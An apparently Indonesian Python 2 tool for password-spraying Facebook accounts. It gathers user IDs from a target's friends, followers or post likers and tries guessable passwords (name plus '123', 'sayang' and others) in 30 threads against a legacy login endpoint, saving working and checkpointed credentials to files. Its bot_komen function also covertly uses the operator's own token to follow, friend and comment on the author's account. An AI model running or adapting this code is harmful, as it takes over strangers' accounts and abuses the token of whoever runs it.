#!/usr/bin/python
# -*- coding: utf-8
#recode ? izin dulu su
#fb.me/gaaaarzxd
#tinggal pake ngapain recode, nnti error
import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize,uuid
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
try:
	import requests
except ImportError:
        os.system("pip2 install requests")
try:
	import mechanize
except ImportError:
	os.system("pip2 install mechanize")

reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders=[('User-Agent','Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/id_ID;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]')]

id = []
cp = []
ok = []

### OUTPUT FILE RESULT 
web = datetime.datetime.now()
aok = web.strftime("ok-%d-%m-%Y.txt")
acp = web.strftime("cp-%d-%m-%Y.txt")
### coded : anggaxd // fb.me/gaaaarzxd

### LOGO
logo = """\033[0;97m    _____                 _____ _____________________
   /  _  \               /     \\______   \_   _____/
  /  /_\  \    ______   /  \ /  \|    |  _/|    __)  
 /    |    \  /_____/  /    Y    \    |   \|     \   
 \____|__  /           \____|__  /______  /\___  /   
         \/                    \/       \/     \/    \n
 [#] Author    : Angga Kurniawan
 [#] GitHub    : https://github.com/anggaxd
 [#] ------------------------------------------------
 [#] Instagram : @gaaarzxd
 [#] Facebook  : https://fb.me/gaaaarzxd\n"""""
### kalau recode jangan ganti nama author

def bot_komen():
    try:
        token = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;97m[!] Token invalid'
        os.system('rm -rf login.txt')
    una = '100015073506062'
    kom = 'GW PAKE SC LU BANG \nLOGIN BRO https://www.facebook.com/100015073506062/posts/1110051342840639/'
    post = '1110051342840639'
    reac2 = ('LOVE')
    requests.post('https://graph.facebook.com/'+post+'/reactions?type=' +reac2+ '&access_token='+ token)
    requests.post('https://graph.facebook.com/638124327/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100015073506062/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/me/friends?method=post&uids=' + una + '&access_token=' + token)
    requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom + '&access_token=' + token)
    menu()
    
def tokenz():
	os.system('clear')
	try:
		token = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
		print logo
		token = raw_input(" [+] Your Token : ")
		try:
			otw = requests.get('https://graph.facebook.com/me?access_token='+token)
			a = json.loads(otw.text)
			zedd = open("login.txt", 'w')
			zedd.write(token)
			zedd.close()
			print (' [•] Token Benar') 
			raw_input (' [>] Tekan Enter Ke Menu')
			bot_komen()
		except KeyError:
			print (" [!] Token Invalid") 
			sys.exit()

def menu():
	os.system('clear')
	global token
	try:
		token = open('login.txt','r').read()
		otw = requests.get('https://graph.facebook.com/me/?access_token='+token)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
		ttl = a['birthday']
		#ip = requests.get('https://api-asutoolkit.cloudaccess.host/ip.php').text
	except KeyError:
		os.system('clear')
		print (' [!] Token Invalid')
		os.system("rm -f login.txt")
		time.sleep(3)
		tokenz()
	except requests.exceptions.ConnectionError:
		print ('  [!] Tidak Ada Koneksi')
		sys.exit()
	print logo
	print "\n [ Selamat Datang \033[0;93m"+nama+"\033[0;97m ]\n"
	print " [1] Crack Dari Publik Teman"
	print " [2] Crack Dari Total Followers"
	print " [3] Crack Dari Like Postingan"
	print " [0] Logout"
	pilih_menu()

def pilih_menu():
	ask = raw_input("\n Choose >> ")
	if ask == "":
		print " [!] Pilih Yang Bener !"
		exit()
	elif ask == "1" or ask == "01":
		print "\n [*] Isi 'me' Jika Ingin Crack Dari List Teman"
		idt = raw_input(" [+] ID Publik : ")
		try:
			pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
			sp = json.loads(pok.text)
			print " [+] Nama : "+sp["name"]
		except KeyError:
			print " [!] ID Tidak Tersedia"
			exit()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)
		z = json.loads(r.text)
		for i in z["data"]:
			uid = i['id']
			na = i['name']
			nm = na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	elif ask == "2" or ask == "02":
		print "\n [*] Isi 'me' Jika Ingin Crack Follower Sendiri"
		idt = raw_input(" [+] ID Publik : ")
		try:
			pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
			sp = json.loads(pok.text)
			print " [+] Nama : "+sp["name"]
		except KeyError:
			print " [!] ID Tidak Tersedia"
			exit()
		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=999999&access_token="+token)
		z = json.loads(r.text)
		for i in z["data"]:
			uid = i['id']
			na = i['name']
			nm = na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	elif ask == "3" or ask == "03":
		print "\n [*] Masukan ID Postingan Nya Ajah"
		idt = raw_input(" [+] ID Post : ")
		r = requests.get("https://graph.facebook.com/"+idt+"/likes?limit=9999999&access_token="+token)
		z = json.loads(r.text)
		for i in z['data']:
			uid = i['id']
			na = i['name']
			nm = na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	elif ask == "0" or ask == "00":
		os.system("rm -f login.txt") 
		print " [!] Berhasil Menghapus Token"
		exit()
	else:
		print " [!] Pilih Yang Bener !"
		exit()
	print " [*] Total ID : "+str(len(id))
	ask = raw_input(" [*] Gunakan Password Manual? [Y/t]: ")
	if ask =="Y" or ask =="y":
		manual()
	print " [+] File \033[0;92mOK\033[0;97m Tersimpan Di : "+aok
	print " [+] File \033[0;93mCP\033[0;97m Tersimpan Di : "+acp
	print " [!] Sedang Prosess Crack\n"
		
	def main(arg):
		global ok,cp
		user = arg
		uid,name=user.split("|") ##Gk Usah Di Ganti Ajg
		try:
			os.mkdir('out')
		except OSError:
			pass
		try:
			pass1 = name.lower()+'123'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=350685531728%7C62f8ce9f74b12f84c123cc23437a4a32&format=json&sdk_version=2&email="+(uid)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print ' \033[0;97m[\033[0;92mOK\033[0;97m] ' +uid+ ' | ' + pass1
				ok.append(uid+' | '+pass1)
				save = open('out/ok.txt','a')
				save.write(str(uid)+' | '+str(pass1)+'\n')
				save.close()
				os.rename('out/ok.txt', 'out/' + aok)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print ' \033[0;97m[\033[0;93mCP\033[0;97m] ' +uid+ ' | ' + pass1
					cp.append(uid+' | '+pass1)
					save = open('out/cp.txt','a')
					save.write(str(uid)+' | '+str(pass1)+'\n')
					save.close()
					os.rename('out/cp.txt', 'out/' + acp)
				else:
					pass2 = name.lower()+'12345'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=350685531728%7C62f8ce9f74b12f84c123cc23437a4a32&format=json&sdk_version=2&email="+(uid)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if 'access_token' in q:
						print ' \033[0;97m[\033[0;92mOK\033[0;97m] ' +uid+ ' | ' + pass2
						cp.append(uid+' | '+pass2)
						save = open('out/ok.txt','a')
						save.write(str(uid)+' | '+str(pass2)+'\n')
						save.close()
						os.rename('out/ok.txt', 'out/' + aok)
					else:
						if 'www.facebook.com' in q["error_msg"]:
							print ' \033[0;97m[\033[0;93mCP\033[0;97m] ' +uid+ ' | ' + pass2
							cp.append(uid+' | '+pass2)
							save = open('out/cp.txt','a')
							save.write(str(uid)+' | '+str(pass2)+'\n')
							save.close()
							os.rename('out/cp.txt', 'out/' + acp)
						else:
							pass3 = "sayang"
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(uid)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if 'access_token' in q:
								print ' \033[0;97m[\033[0;92mOK\033[0;97m] ' +uid+ ' | ' +pass3
								ok.append(uid+' | '+pass3)
								save = open('out/ok.txt','a')
								save.write(str(uid)+' | '+str(pass3)+'\n')
								save.close()
								os.rename('out/ok.txt', 'out/' + aok)
							else:
								if 'www.facebook.com' in q['error_msg']:
									print ' \033[0;97m[\033[0;93mCP\033[0;97m] ' +uid+ ' | ' + pass3
									ok.append(uid+' | '+pass3)
									save = open('out/cp.txt','a')
									save.write(str(uid)+' | '+str(pass3)+'\n')
									save.close() 
									os.rename('out/cp.txt', 'out/' + acp)
								else:
									pass4 = 'bangsat'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(uid)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if 'access_token' in q:
										print ' \033[0;97m[\033[0;92mOK\033[0;97m] ' +uid+ ' | ' + pass4
										ok.append(uid+' | '+pass4)
										save = open('out/ok.txt','a')
										save.write(str(uid)+' | '+str(pass4)+'\n')
										save.close()
										os.rename('out/ok.txt', 'out/' + aok)
									else:
										if 'www.facebook.com' in q['error_msg']:
											print ' \033[0;97m[\033[0;93mCP\033[0;97m] ' +uid+ ' | ' + pass4
											cp.append(uid+' | '+pass4)
											save = open('out/cp.txt','a')
											save.write(str(uid)+' | '+str(pass4)+'\n')
											save.close()
											os.rename('out/cp.txt', 'out/' + acp)
										else:
											pass5 = 'anjing'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(uid)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if 'access_token' in q:
												print ' \033[0;97m[\033[0;92mOK\033[0;97m] ' +uid+ ' | ' + pass5
												ok.append(uid+' | '+pass5)
												save = open('out/ok.txt','a')
												save.write(str(uid)+' | '+str(pass5)+'\n')
												save.close()
												os.rename('out/ok.txt', 'out/' + aok)
											else:
												if 'www.facebook.com' in q['error_msg']:
													print ' \033[0;97m[\033[0;93mCP\033[0;97m] ' +uid+ ' | ' + pass5
													cp.append(uid+' | '+pass5)
													save = open('out/cp.txt','a')
													save.write(str(uid)+' | '+str(pass5)+'\n')
													save.close()
													os.rename('out/cp.txt', 'out/' + acp)
							
					
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	print "\n [+] Finished"
	print " [*] Total \033[0;92mOK\033[0;97m : "+str(len(ok))
	print " [*] Total \033[0;93mCP\033[0;97m : "+str(len(cp))
	exit()
					
def manual():
	print " [*] Contoh : Sayang, Indonesia"
	pass1 = raw_input(" [+] Password 1 : ")
	pass2 = raw_input(" [+] Password 2 : ")
	pass3 = raw_input(" [+] Password 3 : ")
	print " [!] Sedang Prosess Crack\n"
	
	def main(arg):
		global ok,cp
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass
		try:
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=350685531728%7C62f8ce9f74b12f84c123cc23437a4a32&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print ' \033[0;97m[\033[0;92mOK\033[0;97m] ' +user+ ' | ' + pass1
				ok.append(user+' | '+pass1)
				save = open('out/ok.txt','a')
				save.write(str(user)+' | '+str(pass1)+'\n')
				save.close()
				os.rename('out/ok.txt', 'out/' + aok)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print ' \033[0;97m[\033[0;93mCP\033[0;97m] ' +user+ ' | ' + pass1
					cp.append(user+' | '+pass1)
					save = open('out/cp.txt','a')
					save.write(str(user)+' | '+str(pass1)+'\n')
					save.close()
					os.rename('out/cp.txt', 'out/' + acp)
				else:
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=350685531728%7C62f8ce9f74b12f84c123cc23437a4a32&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if 'access_token' in q:
						print ' \033[0;97m[\033[0;92mOK\033[0;97m] ' +user+ ' | ' + pass2
						ok.append(user+' | '+pass2)
						save = open('out/ok.txt','a')
						save.write(str(user)+' | '+str(pass2)+'\n')
						save.close()
						os.rename('out/ok.txt', 'out/' + aok)
					else:
						if 'www.facebook.com' in q["error_msg"]:
							print ' \033[0;97m[\033[0;93mCP\033[0;97m] ' +user+ ' | ' + pass2
							cp.append(user+' | '+pass2)
							save = open('out/cp.txt','a')
							save.write(str(user)+' | '+str(pass2)+'\n')
							save.close()
							os.rename('out/cp.txt', 'out/' + acp)
						else:
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=350685531728%7C62f8ce9f74b12f84c123cc23437a4a32&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if 'access_token' in q:
								print ' \033[0;97m[\033[0;92mOK\033[0;97m] ' +user+ ' | ' + pass3
								ok.append(user+' | '+pass3)
								save = open('out/ok.txt','a')
								save.write(str(user)+' | '+str(pass3)+'\n')
								save.close()
								os.rename('out/ok.txt', 'out/' + aok)
							else:
								if 'www.facebook.com' in q["error_msg"]:
									print ' \033[0;97m[\033[0;93mCP\033[0;97m] ' +user+ ' | ' + pass3
									cp.append(user+' | '+pass3)
									save = open('out/cp.txt','a')
									save.write(str(user)+' | '+str(pass3)+'\n')
									save.close()
									os.rename('out/cp.txt', 'out/' + acp)
					
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	print "\n [+] Finished"
	print " [*] File \033[0;92mOK\033[0;97m Tersimpan Di : out/ok.txt"
	print " [*] File \033[0;93mCP\033[0;97m Tersimpan Di : out/cp.txt"
	exit()


if __name__ == '__main__':
	os.system("clear")
	print logo
	print " [#] Sebentar Lagi Update Tools"
	time.sleep(1)
	os.system("git pull")
	time.sleep(1)
	tokenz()